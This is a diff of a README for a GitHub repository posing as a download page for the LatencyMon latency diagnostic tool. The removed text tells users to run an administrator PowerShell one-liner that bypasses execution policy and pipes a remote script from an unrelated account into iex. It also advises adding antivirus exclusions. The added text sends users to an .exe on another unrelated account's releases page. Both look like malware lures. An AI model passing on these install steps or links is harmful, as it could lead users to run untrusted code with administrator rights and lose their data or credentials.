@@ -1,126 +1,68 @@
-# LatencyMon Download for Windows 11 & 10
+# 📊 LatencyMon - Fix audio stutter and system lag
 
-**LatencyMon**
+[![](https://img.shields.io/badge/Download-LatencyMon-blue.svg)](https://github.com/Morganplundering874/LatencyMon/releases)
 
-**LatencyMon** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+LatencyMon checks your computer for hidden issues that cause audio glitches, choppy video, and system slowdowns. High system latency happens when drivers or background processes block your processor from completing tasks on time. This tool monitors your system and identifies the specific drivers causing these delays.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+## 📥 How to download the software
 
----
+1. Visit the [official releases page](https://github.com/Morganplundering874/LatencyMon/releases) to view all versions.
+2. Look for the most recent version at the top of the list.
+3. Click the link ending in .exe to download the installer to your computer.
+4. Save the file to your Downloads folder or another location you can easily find.
 
-## Download & Install (PowerShell)
+## 🛠️ Step-by-step installation
 
-> **This is the download page.** The command below downloads and runs the **LatencyMon** installer on Windows 10/11.
+1. Locate the file you just downloaded.
+2. Double-click the file to start the setup wizard.
+3. Follow the prompts on the screen.
+4. Keep the default settings during the installation process unless you have a specific reason to change them.
+5. Click Finish once the installer completes the process.
+6. Look for a new icon on your desktop or in your start menu to open the application.
 
-#### Before you start
+## 🔍 How to run a diagnostic test
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+1. Open the application from your desktop.
+2. Click the large green button labeled Start to begin monitoring.
+3. Let the application run in the background while you perform your normal tasks.
+4. If you notice audio stutter or lag, keep the application open so it can capture the data during those moments.
+5. Watch the main dashboard for red or yellow bars. These colors indicate high latency, which shows that a driver is struggling to keep up with system demands.
+6. Click the Stop button once you finish your testing session.
 
----
+## 🧠 Understanding your results
 
-#### Step 1 — Open PowerShell as Administrator
+The application shows three main categories for latency: Total, Highest, and Current. 
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+- The Total column shows the overall average delay during the session.
+- The Highest column highlights the worst performance spikes.
+- The Current column displays the live state of your system.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+If the application logs show high delays, look at the Drivers tab. This tab lists every file currently interacting with your processor. A process flagged in red is usually the cause of your sound issues or stuttering.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+## 💡 Troubleshooting common issues
 
----
+Most latency issues stem from outdated hardware drivers. After identifying the problematic process in the Drivers tab, follow these steps to improve performance:
 
-#### Step 2 — Copy the full command
+1. Right-click your Start button and select Device Manager.
+2. Find the component related to the reported issue, such as your Network adapter or Sound card.
+3. Right-click the component and select Update driver.
+4. Choose the option to search automatically for drivers.
+5. Restart your computer after updating the driver.
 
-Select **both lines** below and press **Ctrl+C**:
+Disable unnecessary background programs to lower total latency. Antivirus software, cloud storage synchronization, and heavy update managers can often consume processor cycles and interfere with real-time audio playback. Close these programs while you play games or record audio to determine if they contribute to the problem.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## ⚙️ System requirements
 
-> Copy **both lines**, not just the second one.
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: 4 GB of RAM or higher.
+- Storage: 50 MB of free space.
+- Access: Administrative privileges for the initial installation.
 
----
+## 🎯 Tips for better results
 
-#### Step 3 — Paste into PowerShell and press Enter
+Run the application for at least ten minutes to get an accurate profile of your system health. Testing for only a few seconds often misses occasional spikes. If you experience stuttering while gaming, run the test during a typical gaming session. If the issues occur during web browsing, keep the browser open. 
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+Do not worry about small fluctuations in latency. Minor changes are normal for a PC. Only focus on prolonged periods of high latency marked in red. These spikes are the ones that disrupt audio playback and cause frame drops in games. 
 
----
-
-#### Step 4 — Finish setup
-
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
-
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **LatencyMon** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**LatencyMon** setup page for Windows PC gamers.
-
-**People also search for:** latencymon download, latencymon dpc latency audio stutter gaming fix
-
-**Repository:** `LatencyMon`
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
-
----
-
-**Topics:** latencymon-download, latencymon, latencymon-dpc-latency-audio-stutter-gaming-fix, latency, stutter, gaming, latencymon-2026, dpc-latency, audio-stutter, diagnostic, software, windows-11
+If you suspect your graphics driver causes the lag, visit the website for your GPU manufacturer. Download the latest version of their official driver utility to ensure your hardware runs the newest software. Many users report significant improvements after updating these specific files.
